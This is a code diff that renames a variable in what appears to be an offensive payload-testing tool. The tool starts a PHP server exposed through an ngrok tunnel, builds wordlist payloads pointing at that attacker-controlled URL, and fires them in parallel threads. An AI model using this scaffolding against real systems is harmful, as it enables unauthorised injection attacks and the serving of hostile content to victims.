@@ -25,23 +25,23 @@ argv = parser.parse_args()
 
 input_wordlist = starter(argv)
 engine = Engine()
-FPathApp = PathFunction()
+path_fn = PathFunction()
 
 def main():
     if argv.server:
-        p = engine.generate_payloads(input_wordlist, FPathApp.urler(argv.server))
+        p = engine.generate_payloads(input_wordlist, path_fn.urler(argv.server))
     elif argv.auto:
         if ',' in argv.auto:
             server_path, public_path = argv.auto.split(',')
-            public_url = FPathApp.unslasher(FPathApp.slasher(ngrok.connect(port = port)) + FPathApp.payloader(public_path))
+            public_url = path_fn.unslasher(path_fn.slasher(ngrok.connect(port = port)) + path_fn.payloader(public_path))
             system(f"(cd {server_path}; fuser -k {port}/tcp; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)")
             print(f"{ColorObj.information} URL generated: {public_url} ")
         else:
             server_path = argv.auto
-            public_url = FPathApp.unslasher(ngrok.connect(port = port))
+            public_url = path_fn.unslasher(ngrok.connect(port = port))
             system(f"(cd {server_path}; fuser -k {port}/tcp; php -S 0.0.0.0:{port} 1>/dev/null 2>/dev/null &)")
             print(f"{ColorObj.information} URL generated: {public_url} ")
-        p = engine.generate_payloads(input_wordlist, FPathApp.urler(public_url))
+        p = engine.generate_payloads(input_wordlist, path_fn.urler(public_url))
     s = [payload for payload_list in p for payload in payload_list]
     with ThreadPoolExecutor(max_workers=argv.threads) as submitter:
         futures_objects = [submitter.submit(engine.try_payload, i) for i in s]
